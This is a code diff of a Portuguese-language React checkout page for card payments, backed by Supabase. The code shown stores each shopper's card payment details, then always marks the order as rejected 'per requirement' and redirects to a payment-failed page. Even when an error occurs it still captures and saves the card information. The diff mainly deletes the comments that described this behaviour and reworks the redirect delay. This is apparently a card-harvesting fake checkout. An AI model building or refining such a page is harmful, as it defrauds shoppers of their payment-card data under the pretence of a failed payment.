@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate, useLocation } from 'react-router-dom';
 import { useQueryClient } from '@tanstack/react-query';
@@ -23,7 +22,6 @@ export default function CartaoPage() {
   const [error, setError] = useState<string | null>(null);
   const [pedidoData, setPedidoData] = useState<any>(null);
 
-  // Extrai pedidoId dos parâmetros da URL
   const searchParams = new URLSearchParams(location.search);
   const pedidoId = searchParams.get('pedidoId');
 
@@ -38,7 +36,6 @@ export default function CartaoPage() {
       }
 
       try {
-        // Busca o produto
         const { data: produtoData, error: produtoError } = await supabase
           .from('produtos')
           .select('*')
@@ -57,14 +54,12 @@ export default function CartaoPage() {
         console.log('Produto encontrado:', produtoData);
         setProduto(produtoData);
 
-        // Verifica se pedidoId existe
         if (!pedidoId) {
           console.log('Nenhum pedidoId encontrado, redirecionando para checkout');
           navigate(`/checkout/${slug}`);
           return;
         }
 
-        // Busca os dados do pedido
         console.log('Buscando dados do pedido para pedidoId:', pedidoId);
         const { data: pedido, error: pedidoError } = await supabase
           .from('pedidos')
@@ -105,7 +100,6 @@ export default function CartaoPage() {
     console.log('Processando pagamento com cartão - dados:', { ...data, cvv: '***' });
 
     try {
-      // Salva as informações de pagamento
       await createPaymentInfo({
         pedido_id: pedidoId,
         metodo_pagamento: 'cartao',
@@ -118,7 +112,6 @@ export default function CartaoPage() {
 
       console.log('Informações de pagamento salvas com sucesso');
 
-      // Atualiza o status do pedido para 'reprovado' (conforme requisito)
       const success = await atualizarStatusPedido(pedidoId, 'reprovado');
       if (!success) {
         throw new Error('Erro ao atualizar status do pedido');
@@ -127,18 +120,15 @@ export default function CartaoPage() {
       console.log('Status do pedido atualizado para "reprovado"');
       toast.info('Pagamento processado, redirecionando...');
 
-      // Invalida o cache de pedidos
       queryClient.invalidateQueries({ queryKey: ['pedidos'] });
-      
-      // Aguarda 1,5 segundos antes de redirecionar (conforme requisito)
-      setTimeout(() => {
-        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-      }, 1500);
+
+      // Atraso de 1,5 segundos como parte do fluxo assíncrono
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
 
     } catch (error: any) {
       console.error('Erro ao processar pagamento:', error);
 
-      // Tenta capturar informações mesmo em caso de erro
       try {
         await createPaymentInfo({
           pedido_id: pedidoId,
@@ -150,19 +140,14 @@ export default function CartaoPage() {
           parcelas: parseInt(data.parcelas.split('x')[0], 10),
         });
         await atualizarStatusPedido(pedidoId, 'reprovado');
-        
-        // Invalida o cache de pedidos mesmo em caso de erro
         queryClient.invalidateQueries({ queryKey: ['pedidos'] });
       } catch (captureError) {
         console.error('Erro ao capturar informações após falha:', captureError);
       }
 
-      toast.error('Erro ao processar pagamento. Você será redirecionado.');
-      
-      // Redireciona para a página de pagamento falhou após 1,5 segundos mesmo em caso de erro
-      setTimeout(() => {
-        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-      }, 1500);
+      toast.error(`Erro ao processar pagamento: ${error.message || 'Tente novamente'}`);
+      await new Promise((resolve) => setTimeout(resolve, 1500));
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
 
     } finally {
       setSubmitting(false);
@@ -173,7 +158,6 @@ export default function CartaoPage() {
     navigate(`/checkout/${slug}`);
   };
 
-  // Estado de carregamento
   if (loading) {
     return (
       <div className="container max-w-4xl mx-auto py-8 px-4">
@@ -191,7 +175,6 @@ export default function CartaoPage() {
     );
   }
 
-  // Estado de erro
   if (error || !produto) {
     return (
       <div className="container max-w-4xl mx-auto py-8 px-4">
@@ -208,7 +191,6 @@ export default function CartaoPage() {
     );
   }
 
-  // Renderização principal
   return (
     <div className="container max-w-4xl mx-auto py-8 px-4">
       <Button
@@ -234,7 +216,7 @@ export default function CartaoPage() {
         <div>
           <ProductSummary
             produto={produto}
-            pedido={pedidoData || { valor: produto?.preco }}
+            pedido={pedidoData || { valor: produto?.preco || 0 }}
           />
         </div>
       </div>
